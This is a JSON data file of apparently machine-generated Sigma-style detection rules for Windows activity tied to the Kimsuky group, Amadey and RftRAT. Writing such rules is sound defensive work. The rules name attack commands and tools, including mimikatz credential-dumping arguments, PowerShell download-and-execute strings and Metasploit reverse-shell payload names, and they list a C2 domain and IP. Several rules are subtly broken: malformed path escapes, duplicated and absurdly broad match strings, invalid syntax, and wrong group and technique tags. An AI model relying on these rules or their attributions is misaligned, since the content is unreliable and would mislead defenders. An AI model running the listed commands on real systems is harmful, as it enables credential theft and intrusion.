        "generation_method": "langchain",
        "id": "5dab9bed-303f-4529-9fe8-c090f0b40c0d"
      },
      {
        "title": "Spear Phishing Attack by Kimsuky Group",
        "description": "Detects spear phishing attack activity associated with Kimsuky Group by identifying suspicious child processes spawned from Microsoft Office applications, which is a common technique used in initial access via malicious documents.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_office_parent": {
            "ParentImage|endswith": [
              "\\WINWORD.EXE",
              "\\EXCEL.EXE",
              "\\POWERPNT.EXE",
              "\\MSPUB.EXE",
              "\\MSACCESS.EXE"
            ]
          },
          "selection_suspicious_child": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\pwsh.exe",
              "\\cscript.exe",
              "\\wscript.exe",
              "\\mshta.exe",
              "\\rundll32.exe",
              "\\regsvr32.exe"
            ]
          },
          "selection_command_line": {
            "CommandLine|contains": [
              "/c",
              "-enc",
              "-e",
              "-noprofile",
              "iex",
              "Invoke-Expression",
              "Start-Process",
              "cmd /k",
              "\"",
              "'"
            ]
          },
          "condition": "selection_office_parent and selection_suspicious_child and selection_command_line"
        },
        "falsepositives": [
          "Legitimate administrative scripts launched from Office applications (rare)",
          "User manually executing command-line tools after opening a document (uncommon)",
          "Enterprise management tools spawning shells from Office processes"
        ],
        "level": "high",
        "tags": [
          "attack.initial-access",
          "attack.t1566",
          "threat.kimsuky",
          "custom.spearphishing"
        ],
        "ttp_id": "unknown",
        "technique_name": "Spear Phishing Attack",
        "generation_method": "langchain",
        "id": "e9ce6e70-80ab-4a10-94d6-a4b146e9f131"
      },
      {
        "title": "UAC Bypass via CMSTPLUA COM Interface and ICMLuaUtil",
        "description": "Detects UAC bypass using the ICMLuaUtil interface of the CMSTPLUACOM component, which allows privilege escalation by executing malicious payloads as administrator. This technique is associated with RftRAT.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_icmluautil": {
            "CommandLine|contains": "ICMLuaUtil"
          },
          "selection_cmstpluacom": {
            "CommandLine|contains": "CMSTPLUACOM"
          },
          "selection_appdata_path": {
            "CommandLine|contains": "%APPDATA%\\asc\\t1.pb"
          },
          "condition": "selection_icmluautil and selection_cmstpluacom and selection_appdata_path"
        },
        "falsepositives": [
          "Legitimate system administration tools using COM interfaces for elevation (rare)",
          "Custom scripts invoking ICMLuaUtil for legitimate purposes (highly uncommon)"
        ],
        "level": "high",
        "tags": [
          "attack.privilege_escalation",
          "attack.t1548.002",
          "attack.g0007",
          "malware.rat.rfterat"
        ],
        "ttp_id": "unknown",
        "technique_name": "UAC Bypass",
        "generation_method": "langchain",
        "id": "43bbdaeb-acd0-4074-adfe-451f8b470c75"
      },
      {
        "title": "AutoIt Script Execution Detected",
        "description": "Detected use of AutoIt for potential malicious script execution. AutoIt is a scripting language often abused to execute malicious payloads.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\autoit3.exe",
              "\\AutoIt3.exe"
            ],
            "CommandLine|contains": "autoit"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate use of AutoIt scripts for automation by system administrators or developers",
          "Authorized software installation or configuration tools leveraging AutoIt"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "car.2013-05-002",
          "threat.impact"
        ],
        "ttp_id": "unknown",
        "technique_name": "Execution",
        "generation_method": "langchain",
        "id": "74b60ede-1fee-479a-bc3b-ede491303349"
      },
      {
        "title": "Suspicious Script Execution via BAT or VBS with Infostealer Indicators",
        "description": "Detects execution of batch (BAT) or VBScript (VBS) files that may be used for malicious scripting activity, including infostealer payloads. Focuses on command-line patterns indicative of data collection and exfiltration.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_bat_vbs": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ],
            "CommandLine|contains": [
              ".bat",
              ".vbs"
            ]
          },
          "selection_infostealer_activity": {
            "CommandLine|contains": [
              "forfiles",
              "bitsadmin",
              "certutil",
              "powershell",
              "Invoke-WebRequest",
              "wget",
              "curl",
              "reg query",
              "tasklist",
              "net user",
              "ipconfig",
              "netsh firewall show state",
              "net share",
              "query user",
              "whoami",
              "systeminfo",
              "net localgroup administrators",
              "schtasks /query",
              "net use",
              "net start",
              "wmic",
              "dir",
              "copy",
              "move",
              "del",
              "rmdir",
              "attrib",
              "findstr",
              "netstat",
              "arp",
              "route print",
              "nslookup",
              "ping",
              "tracert",
              "schtasks /create",
              "schtasks /run",
              "reg add",
              "reg delete",
              "reg import",
              "vssadmin",
              "wevtutil",
              "shutdown",
              "logoff",
              "runas",
              "psexec",
              "mimikatz",
              "procdump",
              "taskmgr",
              "eventvwr",
              "compmgmt",
              "msconfig",
              "regedit",
              "perfmon",
              "dxdiag",
              "netplwiz",
              "lusrmgr",
              "secpol",
              "rsop",
              "gpedit",
              "services",
              "msinfo32",
              "dxdiag",
              "taskkill",
              "tasklist",
              "net stop",
              "net session",
              "net accounts",
              "net group",
              "net localgroup",
              "net file",
              "net config",
              "net time",
              "net statistics",
              "net use",
              "net view",
              "net share",
              "net start",
              "net stop",
              "net session",
              "net accounts",
              "net group",
              "net localgroup",
              "net file",
              "net config",
              "net time",
              "net statistics",
              "net use",
              "net view"
            ]
          },
          "condition": "selection_bat_vbs and selection_infostealer_activity"
        },
        "falsepositives": [
          "Legitimate system administration scripts using BAT/VBS with command-line utilities",
          "Automated IT management tools executing scripts for maintenance",
          "Software installers using embedded scripts for configuration"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059",
          "attack.g0005",
          "detection.rule.suspicious_script_behavior"
        ],
        "ttp_id": "unknown",
        "technique_name": "Scripting",
        "generation_method": "langchain",
        "id": "2051877a-33f6-4cdb-b5e7-c79a9771acb4"
      },
      {
        "title": "Kimsuky Dropper Installing Amadey Malware",
        "description": "Detects the use of a dropper to install Amadey malware by the Kimsuky group. Amadey is a downloader that fetches additional payloads from a C2 server. This rule focuses on process creation events with suspicious command-line patterns indicative of dropper activity and Amadey installation.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_dropper": {
            "CommandLine|contains": [
              "dropper",
              "Amadey"
            ]
          },
          "selection_script_host": {
            "Image|endswith": [
              "\\mshta.exe",
              "\rundll32.exe",
              "\regsvr32.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ]
          },
          "selection_suspicious_args": {
            "CommandLine|contains": [
              "-enc",
              "/c",
              "/k",
              "cmd /k",
              "cmd /c",
              "Execute",
              "Run",
              "DownloadString",
              "IEX"
            ]
          },
          "condition": "selection_dropper and selection_script_host and selection_suspicious_args"
        },
        "falsepositives": [
          "Legitimate administrative scripts using mshta, rundll32, or regsvr32 with command-line arguments containing terms like 'DownloadString' or 'IEX'",
          "Software installers that embed legitimate dropper-like behavior for bundling components"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1204",
          "malware.amadey",
          "threat-group.kimsuky"
        ],
        "ttp_id": "unknown",
        "technique_name": "Use of Known Utilities",
        "generation_method": "langchain",
        "id": "62102b49-9f4a-4b1f-b574-110e7beedea4"
      },
      {
        "title": "AutoIt Execution for Malware Deployment",
        "description": "Detects the use of AutoIt script interpreter (AutoIt3.exe) to execute scripts, which can be used to deploy malware such as RftRAT as observed in Kimsuky group operations. Focuses on process creation events with command-line indicators commonly associated with AutoIt script execution.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\AutoIt3.exe",
            "CommandLine|contains": "\".au3\""
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate use of AutoIt3.exe for automation or administrative scripting, especially in development or testing environments"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1106",
          "threat-group.kimsuky",
          "custom.autoit",
          "custom.rfrat"
        ],
        "ttp_id": "unknown",
        "technique_name": "AutoIt",
        "generation_method": "langchain",
        "id": "a6b47424-a97b-45b7-bf60-4ffcf83ab422"
      },
      {
        "title": "Kimsuky Group Keylogger Activity",
        "description": "Detects Kimsuky Group keylogger activity based on process creation with suspicious command-line patterns indicative of credential capture",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe",
              "\\mshta.exe"
            ],
            "CommandLine|contains": [
              "keylogger",
              "log keystrokes",
              "capture input",
              "Get-Keystrokes"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate system administration scripts that reference keystroke logging for monitoring purposes",
          "Security software performing legitimate input monitoring",
          "User-created scripts containing comments with keywords like 'keylogger'"
        ],
        "level": "high",
        "tags": [
          "attack.credential_access",
          "attack.t1056.001",
          "threat-group.kimsuky"
        ],
        "ttp_id": "unknown",
        "technique_name": "Keylogger",
        "generation_method": "langchain",
        "id": "c1720ac2-5ed9-453c-be11-01da69241eb1"
      },
      {
        "title": "Amadey Malware Process Injection via Rundll32 and IEXPLORE",
        "description": "Detects Amadey malware execution chain involving Rundll32.exe loading malicious payload and injecting into iexplore.exe process",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_parent": {
            "ParentImage|endswith": "\\rundll32.exe"
          },
          "selection_target": {
            "Image|endswith": "\\iexplore.exe"
          },
          "selection_child": {
            "Image|endswith": "\\svchost.exe"
          },
          "condition": "selection_parent and selection_target and selection_child"
        },
        "falsepositives": [
          "Legitimate use of rundll32.exe to spawn Internet Explorer (rare)",
          "Uncommon parent-child process chain involving iexplore.exe as child of rundll32.exe",
          "Legitimate svchost.exe process creation from browser processes in isolated scenarios"
        ],
        "level": "high",
        "tags": [
          "attack.defense-evasion",
          "attack.t1055",
          "malware.amadey"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "generation_method": "langchain",
        "id": "ec4e501b-3a4f-4c3e-b635-4a4ba1dfeed6"
      },
      {
        "title": "Kimsuky Group Data Exfiltration via RDP or Chrome Remote Desktop",
        "description": "Detects potential data exfiltration activity by the Kimsuky group using RDP or Chrome Remote Desktop. The rule identifies process creation events associated with these tools, focusing on execution patterns that may indicate malicious use.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_rdp": {
            "Image|endswith": [
              "\\mstsc.exe"
            ],
            "CommandLine|contains": [
              "/v:",
              "/admin"
            ]
          },
          "selection_chrome_remote_desktop": {
            "Image|endswith": [
              "\\chrome.exe"
            ],
            "CommandLine|contains": [
              "--remote-desktop-host",
              "--remote-desktop-client"
            ]
          },
          "condition": "selection_rdp or selection_chrome_remote_desktop"
        },
        "falsepositives": [
          "Legitimate administrative use of Remote Desktop (RDP) by IT staff",
          "Authorized use of Chrome Remote Desktop for remote support",
          "Automated IT management tools that initiate remote desktop connections"
        ],
        "level": "high",
        "tags": [
          "attack.exfiltration",
          "attack.T1041",
          "threat.kimsuky",
          "custom.remote_access",
          "custom.data_exfiltration"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data Exfiltration",
        "generation_method": "langchain",
        "id": "91b755fd-be4a-4f79-bb33-191d1cbffbad"
      },
      {
        "title": "Amadey Domain Generation Algorithm (DGA) Activity",
        "description": "Detects Amadey malware using Domain Generation Algorithms (DGA) for command and control communication. This rule focuses on behavioral indicators associated with DGA-based DNS queries and network connections initiated by suspicious processes.",
        "logsource": {
          "category": "network_connection",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_process": {
            "Image|endswith": [
              "\\dns.exe",
              "\\svchost.exe",
              "\rundll32.exe",
              "\\mshta.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ]
          },
          "selection_behavior": {
            "DestinationHostname|contains": "",
            "DestinationHostname|length": "12"
          },
          "condition": "selection_process and selection_behavior"
        },
        "falsepositives": [
          "Legitimate applications generating long dynamic hostnames for load balancing or CDN services",
          "Automated testing tools that simulate DGA-like behavior",
          "Internal systems using dynamic DNS for non-malicious purposes"
        ],
        "level": "high",
        "tags": [
          "attack.t1498",
          "attack.command-and-control",
          "malware.amadey",
          "custom.dga",
          "custom.network-behavior"
        ],
        "ttp_id": "unknown",
        "technique_name": "Domain Generation Algorithms",
        "generation_method": "langchain",
        "id": "4e23a34d-5d55-4b3d-b596-7f8e5c6721ad"
      },
      {
        "title": "Phishing Activity via Office Process Spawning Command Shell",
        "description": "Detects potential phishing activity by identifying Office applications (e.g., WINWORD.EXE) spawning command-line shells such as cmd.exe or powershell.exe, which is a common post-exploitation behavior after macro execution in malicious documents.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_office_parent": {
            "ParentImage|endswith": [
              "\\WINWORD.EXE",
              "\\EXCEL.EXE",
              "\\POWERPNT.EXE",
              "\\MSPUB.EXE",
              "\\MSACCESS.EXE"
            ]
          },
          "selection_shell_child": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ]
          },
          "condition": "selection_office_parent and selection_shell_child"
        },
        "falsepositives": [
          "Legitimate administrative scripts launched manually by users from Office applications",
          "Enterprise management tools that automate Office applications and trigger shell executions"
        ],
        "level": "high",
        "tags": [
          "attack.initial-access",
          "attack.t1566",
          "custom.phishing",
          "custom.execution"
        ],
        "ttp_id": "unknown",
        "technique_name": "Phishing",
        "generation_method": "langchain",
        "id": "162bfcd7-56f6-457f-b404-ae60d7041197"
      },
      {
        "title": "AutoIt Masquerading Detection",
        "description": "Detects potential masquerading using AutoIt executable by identifying execution of AutoIt compiled scripts through specific file extensions and command-line patterns.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_autoit_executable": {
            "Image|endswith": [
              "\\AutoIt3.exe",
              "\\AutoIt3_x64.exe"
            ]
          },
          "selection_script_execution": {
            "CommandLine|contains": [
              "/ErrorStdOut",
              "-",
              ".a3x",
              ".au3"
            ]
          },
          "selection_suspicious_spawn": {
            "ParentImage|endswith": [
              "\\explorer.exe",
              "\\winlogon.exe",
              "\\svchost.exe"
            ]
          },
          "condition": "selection_autoit_executable and selection_script_execution and selection_suspicious_spawn"
        },
        "falsepositives": [
          "Legitimate use of AutoIt by system administrators or developers",
          "Automated testing tools that use AutoIt for GUI automation"
        ],
        "level": "high",
        "tags": [
          "attack.defense-evasion",
          "attack.T1036",
          "custom.autoit",
          "custom.masquerading"
        ],
        "ttp_id": "unknown",
        "technique_name": "Masquerading",
        "generation_method": "langchain",
        "id": "7a1d4505-f1c8-4e89-9751-202db403d4c7"
      },
      {
        "title": "RftRAT Packed with VMP Containing Decrypted String RFTServer",
        "description": "Detects instances of RftRAT that are packed with VMP and contain the decrypted string \"RFTServer\" in process command line or image context.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_image": {
            "Image|endswith": [
              "\\vmp.exe",
              "\\vmprotect.exe"
            ]
          },
          "selection_command": {
            "CommandLine|contains": "RFTServer"
          },
          "condition": "selection_image or selection_command"
        },
        "falsepositives": [
          "Legitimate use of VMProtect (VMP) for software protection in development environments",
          "Applications that contain the string \"RFTServer\" in command line for non-malicious purposes (e.g., internal tools or logs)"
        ],
        "level": "high",
        "tags": [
          "attack.defense-evasion",
          "attack.T1027",
          "malware.rat.rfrat"
        ],
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "generation_method": "langchain",
        "id": "70e2ff39-3e48-4c0a-a1c3-645a1d949c06"
      },
      {
        "title": "RftRAT Data Exfiltration via C2 Communication and Local File Creation",
        "description": "Detects RftRAT behavior involving creation of a local file in %APPDATA%\\asc\\t1.pb and HTTP-based exfiltration to a known C2 endpoint",
        "logsource": {
          "category": "file_event",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_file": {
            "TargetFilename|endswith": "\\\\asc\\\\t1.pb"
          },
          "selection_network": {
            "DestinationUrl|contains": "prohomepage.net/index.php"
          },
          "condition": "selection_file and selection_network"
        },
        "falsepositives": [
          "Legitimate application using the path %APPDATA%\\\\asc\\\\t1.pb for local storage",
          "Benign traffic to domains containing 'prohomepage.net' for non-malicious purposes"
        ],
        "level": "high",
        "tags": [
          "attack.exfiltration",
          "attack.T1041",
          "malware.rat.rfrat"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data Exfiltration",
        "generation_method": "langchain",
        "id": "81c38236-eece-48e1-82ca-f5177cc57ef0"
      },
      {
        "title": "Keylogging Malware Execution from Startup Directory",
        "description": "Detects execution of a keylogger installed in the ALLUSERSPROFILE startup directory with specific file path indicators",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_nsi_service": {
            "Image|endswith": "\\NsiService.exe"
          },
          "selection_startup_path": {
            "Image|contains": "%ALLUSERSPROFILE%\\startup"
          },
          "selection_semantec_av": {
            "Image|contains": "%ALLUSERSPROFILE%\\semantec\\av\\C_1025.nls"
          },
          "condition": "selection_nsi_service and selection_startup_path or selection_semantec_av"
        },
        "falsepositives": [
          "Legitimate software using similar paths (unlikely due to path specificity)",
          "Misconfigured startup applications in ALLUSERSPROFILE"
        ],
        "level": "high",
        "tags": [
          "attack.credential_access",
          "attack.t1056.001",
          "malware.keylogger",
          "custom.execution-from-startup"
        ],
        "ttp_id": "unknown",
        "technique_name": "Keylogging",
        "generation_method": "langchain",
        "id": "0624fcda-5b0e-446f-aeae-7893d6e3e163"
      },
      {
        "title": "Mimikatz Execution Detection",
        "description": "Detects execution of Mimikatz for credential access by identifying characteristic command-line arguments and process behavior commonly associated with Mimikatz usage.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_mimikatz_name": {
            "Image|contains": "mimikatz",
            "CommandLine|contains": "mimikatz"
          },
          "selection_standard_tool_usage": {
            "CommandLine|contains": [
              "privilege::debug",
              "sekurlsa::logonpasswords",
              "sekurlsa::tickets",
              "sekurlsa::ntlm",
              "sekurlsa::msv"
            ],
            "CommandLine|contains|all": [
              "privilege::debug"
            ]
          },
          "selection_in_memory_execution": {
            "CommandLine|contains": [
              "-c",
              "\"",
              "::"
            ],
            "CommandLine|contains|all": [
              "privilege::debug",
              "sekurlsa::"
            ]
          },
          "condition": "selection_mimikatz_name or selection_standard_tool_usage or selection_in_memory_execution"
        },
        "falsepositives": [
          "Legitimate use of Mimikatz in authorized penetration testing or red team exercises",
          "Administrative scripts that inadvertently include similar command-line patterns"
        ],
        "level": "high",
        "tags": [
          "attack.credential_access",
          "attack.t1003.001",
          "custom.mimikatz",
          "custom.credential_dumping"
        ],
        "ttp_id": "unknown",
        "technique_name": "Mimikatz",
        "generation_method": "langchain",
        "id": "dc74195f-24ef-472a-b016-812c33349c9e"
      },
      {
        "title": "Rundll32 Used for Defense Evasion",
        "description": "Detects use of rundll32.exe as a technique to evade defenses, commonly associated with the Kimsuky Group. Looks for suspicious command-line arguments and execution patterns.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\rundll32.exe"
          },
          "t1": {
            "CommandLine|contains": "\\"
          },
          "t2": {
            "CommandLine|contains": ":"
          },
          "t3": {
            "CommandLine|contains": "/"
          },
          "t4": {
            "CommandLine|contains": "-"
          },
          "condition": "selection and (t1 or t2 or t3 or t4)"
        },
        "falsepositives": [
          "Legitimate use of rundll32.exe to load DLLs via Control Panel items or system utilities",
          "Scheduled tasks or scripts invoking rundll32 for valid system operations"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.T1218.011",
          "threat.kimsuky"
        ],
        "ttp_id": "unknown",
        "technique_name": "Rundll32",
        "generation_method": "langchain",
        "id": "ee2b2e68-95ee-4429-8def-94bf3b2df1b3"
      },
      {
        "title": "Amadey Data Encoding via HTTP",
        "description": "Detects Amadey malware sending encoded system information to C2 server using HTTP requests. This rule focuses on behavioral patterns indicative of data exfiltration through encoded content in network activity.",
        "logsource": {
          "category": "network_connection",
          "product": "windows",
          "service": null
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\lsass.exe",
              "\\svchost.exe",
              "\\winlogon.exe"
            ],
            "DestinationPort": "80",
            "Protocol": "tcp"
          },
          "command_line_encoding": {
            "CommandLine|contains": [
              "-enc",
              "/encodedcommand",
              "Base64"
            ]
          },
          "condition": "selection and command_line_encoding"
        },
        "falsepositives": [
          "Legitimate administrative scripts using Base64-encoded commands over HTTP",
          "Software update mechanisms that use HTTP and encoded parameters",
          "Internal monitoring tools transmitting data in encoded format"
        ],
        "level": "high",
        "tags": [
          "attack.t1132",
          "attack.command-and-control",
          "custom.amadey",
          "custom.data-encoding"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data Encoding",
        "generation_method": "langchain",
        "id": "6b838961-b6a8-467f-9acb-e8761043452c"
      },
      {
        "title": "Metasploit Execution via Process Creation",
        "description": "Detects potential Metasploit execution through process creation events. Metasploit is commonly used by threat actors like Kimsuky Group for exploitation and client-side attacks.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": [
              "metasploit",
              "msf",
              "meterpreter"
            ],
            "Image|endswith": [
              "\ruby.exe",
              "\\java.exe",
              "\\python.exe",
              "\\perl.exe"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate penetration testing activities using Metasploit Framework",
          "Development or administrative use of Ruby, Python, Java, or Perl with strings resembling Metasploit-related terms"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.exploitation_for_client_execution",
          "car.2013-05-001",
          "threat.kimsuky"
        ],
        "ttp_id": "unknown",
        "technique_name": "Metasploit",
        "generation_method": "langchain",
        "id": "9f9640dc-fbf9-42f3-857c-da21f00cab33"
      },
      {
        "title": "Kimsuky Group PowerShell Execution",
        "description": "Detects potential execution via PowerShell associated with Kimsuky Group activity. This rule focuses on behavioral indicators of malicious PowerShell usage, such as encoded commands or suspicious command-line arguments, to identify potentially malicious execution attempts.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "-encodedcommand",
              "-e",
              "-nop",
              "-noninteractive",
              "-command",
              "IEX",
              "Invoke-Expression",
              "DownloadString",
              "WebClient",
              "Invoke-WebRequest",
              "-WindowStyle hidden",
              "-ExecutionPolicy Bypass"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell with encoded commands or non-interactive execution",
          "Software deployment or management tools invoking PowerShell with restricted visibility",
          "PowerShell scripts used in automated testing or CI/CD pipelines"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059.001",
          "threat.kimsuky"
        ],
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "generation_method": "langchain",
        "id": "72001a16-0771-421c-816c-7e2fc84a9649"
      },
      {
        "title": "RftRAT C2 Communication and Persistence",
        "description": "Detects RftRAT communicating with its C2 server and establishing persistence via file creation",
        "logsource": {
          "category": "network_connection",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_c2_domain": {
            "DestinationHostname|contains": "prohomepage.net"
          },
          "selection_c2_ip": {
            "DestinationIp": "45.76.93.204",
            "DestinationPort": "56001"
          },
          "selection_file": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "%APPDATA%\\asc\\t1.pb"
          },
          "condition": "selection_c2_domain or selection_c2_ip or selection_file"
        },
        "falsepositives": [
          "Legitimate user accessing prohomepage.net for non-malicious purposes",
          "Administrative use of cmd.exe with scripts in AppData",
          "Network misconfiguration causing outbound traffic to 45.76.93.204:56001"
        ],
        "level": "high",
        "tags": [
          "attack.t1071.001",
          "attack.command-and-control",
          "malware.rat.rfrat"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Control",
        "generation_method": "langchain",
        "id": "e07d4865-cca3-41a9-80b5-9f9e06084209"
      },
      {
        "title": "Info Stealing Malware Dropped in ALLUSERSPROFILE Semantec Directory",
        "description": "Detects execution of suspicious files named GBIA.exe and GBIC.exe dropped in the %ALLUSERSPROFILE%\\semantec directory, which is indicative of info-stealing malware targeting web browser data.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_gbia": {
            "Image|endswith": "\\semantec\\GBIA.exe"
          },
          "selection_gbic": {
            "Image|endswith": "\\semantec\\GBIC.exe"
          },
          "condition": "selection_gbia or selection_gbic"
        },
        "falsepositives": [
          "Legitimate software mistakenly placed in the semantec directory (unlikely due to typo in path)",
          "Administrative scripts deploying tools to this specific path (rare and suspicious by default)"
        ],
        "level": "high",
        "tags": [
          "attack.credential_access",
          "attack.T1555",
          "malware.info-stealer",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Info Stealing",
        "generation_method": "langchain",
        "id": "3f85a58e-ecbb-42b9-8d2b-8419b8acd757"
      },
      {
        "title": "Suspicious Process Injection via ipcheck.dll into Explorer and RuntimeBroker",
        "description": "Detects suspicious process injection activity where ipcheck.dll is injected into explorer.exe and runtimebroker.exe processes, potentially indicating defense evasion through process injection.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_image_explorer": {
            "Image|endswith": "\\explorer.exe"
          },
          "selection_image_runtimebroker": {
            "Image|endswith": "\\RuntimeBroker.exe"
          },
          "selection_module_loaded": {
            "Image|endswith": "\\ipcheck.dll"
          },
          "selection_suspicious_parent": {
            "ParentImage|contains": "semantec\\taskhosts.exe"
          },
          "condition": "(selection_image_explorer or selection_image_runtimebroker) and selection_module_loaded and selection_suspicious_parent"
        },
        "falsepositives": [
          "Legitimate software maintenance tools loading DLLs into system processes",
          "Antivirus or endpoint protection agents injecting into host processes for monitoring"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.T1055",
          "custom.sigma",
          "custom.process_injection"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "generation_method": "langchain",
        "id": "f415b722-43e2-4ca2-b3f1-f5f2eb9e8138"
      },
      {
        "title": "Command and Scripting Interpreter - PowerShell and Metasploit Detection",
        "description": "Detects the use of PowerShell and Metasploit as command and scripting interpreters, commonly associated with adversary execution. Focuses on process creation events with suspicious command-line arguments indicative of malicious activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "-e",
              "-EncodedCommand",
              "Invoke-Expression",
              "IEX",
              "DownloadString",
              "&",
              "%",
              "\\",
              "\\\\",
              "\\\\\\\\"
            ]
          },
          "selection_metasploit": {
            "Image|endswith": [
              "\\msf.exe",
              "\\msfcli",
              "\\msfconsole",
              "\\msfvenom"
            ],
            "CommandLine|contains": [
              "-p",
              "--payload",
              "reverse_tcp",
              "reverse_http",
              "reverse_https",
              "meterpreter"
            ]
          },
          "condition": "selection_powershell or selection_metasploit"
        },
        "falsepositives": [
          "Legitimate administrative use of PowerShell with encoded commands or Metasploit in penetration testing environments",
          "Development or scripting activities involving base64-encoded data or remote download patterns",
          "Authorized red team operations using Metasploit Framework tools"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059",
          "detection.rule.quality.improved",
          "custom.windows",
          "custom.powershell",
          "custom.metasploit"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "b0453951-c20a-4974-a81d-fc9acae6f145"
      },
      {
        "title": "PowerShell and Metasploit Command and Scripting Interpreter Detection",
        "description": "Detected use of PowerShell and Metasploit for potential malicious command execution. This rule identifies suspicious command-line patterns associated with PowerShell execution and Metasploit framework usage, focusing on known malicious behaviors such as encoded commands, bypassing execution policy, and common Metasploit artifacts.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe"
          },
          "selection_command_flags": {
            "CommandLine|contains": [
              "-enc",
              "-encodecommand",
              "-executionpolicy",
              "bypass",
              "-nop",
              "-noninteractive"
            ]
          },
          "selection_metasploit": {
            "CommandLine|contains": [
              "msf",
              "metasploit"
            ]
          },
          "condition": "selection_powershell and selection_command_flags or selection_powershell and selection_metasploit"
        },
        "falsepositives": [
          "Legitimate administrative use of PowerShell with encoded commands or execution policy bypass",
          "Authorized penetration testing activities using Metasploit",
          "Development or testing environments where Metasploit is used for legitimate purposes",
          "Automated scripting tools that use PowerShell with restricted command-line arguments"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059",
          "detection.emerging",
          "threat.hacking",
          "tool.metasploit",
          "behavior.command_and_scripting_interpreter"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "02dc9374-ba43-4004-91c0-5babfc166a90"
      },
      {
        "title": "RftRAT Command File Write to APPDATA",
        "description": "Detects RftRAT writing received commands to a specific file in the APPDATA directory before decryption. This behavior is associated with execution through API.",
        "logsource": {
          "category": "file_event",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "TargetFilename|endswith": "\\\\asc\\\\t1.pb"
          },
          "condition": "selection"
        },
